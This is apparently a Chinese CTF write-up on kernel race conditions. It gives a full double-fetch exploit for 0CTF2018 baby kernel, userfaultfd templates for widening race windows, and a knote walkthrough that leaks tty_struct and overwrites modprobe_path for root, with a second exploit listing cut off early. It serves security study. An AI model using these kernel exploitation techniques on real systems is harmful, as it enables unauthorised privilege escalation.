<p><strong>总结</strong>:通过这道题真的能感觉到内核利用中同步引发的条件竞争的魅力，代码看着完全没有问题，但是通过阻塞就能硬生生构造出一个uaf,死高一，以后在漏洞利用的时候要多注意注意条件竞争。</p>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h3 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h3><p>取值两次，第一次进行合法效验，第二次进行数据操作，在这两次中间可以通过多线程改变数据的值，进而让第一次效验失效传入恶意数据。</p>
<h4 id="例题-0CTF2018-Final-baby-kernel"><a href="#例题-0CTF2018-Final-baby-kernel" class="headerlink" title="例题 0CTF2018 Final - baby kernel"></a>例题 0CTF2018 Final - baby kernel</h4><p>这道题之前做过直接放脚本了</p>
<h5 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p>userfaultfd是linux系统在用户态的一个缺页处理机制，用户可以自定义函数来处理此类事件，就像kvm一样，linux系统已经规定好了userfaultfd的接口，用户可以利用规定的接口对某一虚拟内存进行监视，并且可以注册一个函数，当监视内存发生缺页异常的时候就会去执行这个注册函数。</p>
<p>使用userfaultfd的代码分为两部分，一部分是监控并注册函数，一部分是自定义处理函数的定义</p>
<p><strong>注册模板</strong></p>
<p>其中<code>register_userfault</code>函数的第一个参数就是受监控内存，第二个参数就是自定义处理函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(err_msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> thr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">	ua.api = UFFD_API;</span><br><span class="line">	ua.features    = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">	ur.range.len   = PAGE_SIZE;</span><br><span class="line">	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        <span class="comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">		err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">	<span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">	<span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">	<span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">		err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>自定义处理函数模板</strong></p>
<p>可以把自定义处理函数分为两部分，前半部分就是模板操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"><span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">uffd = (<span class="keyword">long</span>) arg;</span><br></pre></td></tr></table></figure>

<p>后半部分是真正的处理代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>理清楚了userfaultfd，那对于条件竞争又有什么用处呢，可以先看下面这段代码,如果这段代码没有加锁，那么当<code>copy_from_user</code>函数要向ptr但还没写入时，此时另一个线程把ptr给free掉然后再把这个堆块申请回来，这个堆块是比较特殊的堆块，比如<code>tty_struct</code>,这样我们就控制了tty_struct,进而可以控制程序流了，但是这样概率会很小，如果访问user_buf发生了缺页异常，那就会停下来去执行缺页异常处理函数，处理完再继续执行<code>copy_from_user</code>函数，如果我们在缺页异常处理函数中再<code>sleep</code>一下，那空档期就非常长了，在这段时间里释放在申请，最后成功写的概率就很大了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptr) &#123;  </span><br><span class="line">   ...  </span><br><span class="line">   copy_from_user(ptr,user_buf,len);  </span><br><span class="line">   ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>说白了使用userfaultfd就是为了提高条件竞争成功的概率。</p>
<p><strong>但是需要注意的是5.11版本以后，非特权用户就被禁止使用userfaultfd了</strong></p>
<h4 id="例题-d3ctf2019-knote"><a href="#例题-d3ctf2019-knote" class="headerlink" title="例题 d3ctf2019-knote"></a>例题 d3ctf2019-knote</h4><p><strong>启动脚本</strong></p>
<p>虚拟了两个cpu,每个cpu一个核，所以可以支持两个线程。保护除了kpti没开以外其他的都开了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>

<p><strong>文件系统启动脚本</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line">mknod /dev/knote c 10 233</span><br><span class="line">chmod 666 /dev/knote</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">chroot . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>这道题就是在内核实现了一个菜单堆，有add,get,del,edit四个功能，其中del和add是加了读写锁的，没法条件竞争，但是get和edit是可以的，所以可以通过get进行条件竞争来完成内核地址泄露，在这个内核版本中tty_struct大小是0x2e0,所以可以先申请一个0x2e0的堆，然后在get的时候条件竞争，在缺页处理的时候先把这个堆块free掉，然后再打开一个<code>ptmx</code>，就会在内核申请一个0x2e0的堆，有概率申请到刚free的堆块，缺页处理完再进行拷贝的话就能得到<code>tty_struct</code>的内容了，就能得到内核地址了，然后在edit的时候再次进行条件竞争就可以任意地址写了，但是怎么利用这个任意地址提升权限呢</p>
<p><strong>modprobe_path</strong></p>
<p>当在用户态使用<code>execve</code>执行一个非法的文件的时候，内核会有如下调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() </span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure>

<p>最后一个函数定义于<code>/kernel/kmod.c</code>,下面就是题目内核版本对应的<code>call_modprobe()</code>源码，在函数的最后会调用<code>call_usermodehelper_exec()</code>函数，将<code>modprobe_path</code>作为可执行文件路径，以root权限将其执行，<code>modprobe_path</code>默认存储着执行路径<code>/sbin/modprobe</code>.</p>
<p>所以可以通过任意地址写接触<code>modprobe_path</code>,将其改写为我们构造的恶意脚本的路径，然后执行一个非法文件触发上述调用链，最后以root用户执行恶意脚本，思路就是这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 